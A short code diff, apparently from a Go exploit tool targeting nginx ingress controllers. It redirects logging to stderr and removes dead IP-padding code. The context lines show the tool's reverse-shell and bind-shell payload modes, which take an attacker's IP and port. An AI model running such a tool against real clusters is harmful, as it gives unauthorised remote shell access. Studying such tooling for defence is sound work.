@@ -72,22 +72,13 @@ var ExpCmd = &cobra.Command{
 			logLevel = log.DebugLevel
 		}
 		log.SetLevel(logLevel)
-		log.SetOutput(os.Stdout)
+		log.SetOutput(os.Stderr)
 		nginx_ingress.Init()
 	},
 	Run: func(cmd *cobra.Command, args []string) {
 		var payload nginx_ingress.Payload
 		switch Opts.Mode {
 		case "reverse-shell", "r":
-			ip := ""
-			for _, part := range strings.Split(Opts.ReverseShellIp.String(), ".") {
-				if len(part) == 1 {
-					part = "00" + part
-				} else if len(part) == 2 {
-					part = "0" + part
-				}
-				ip += part
-			}
 			payload = nginx_ingress.NewReverseShellPayload(Opts.ReverseShellIp.String(), fmt.Sprintf("%d", Opts.ReverseShellPort))
 		case "bind-shell", "b":
 			payload = nginx_ingress.NewBindShellPayload(fmt.Sprintf("%d", Opts.BindShellPort))
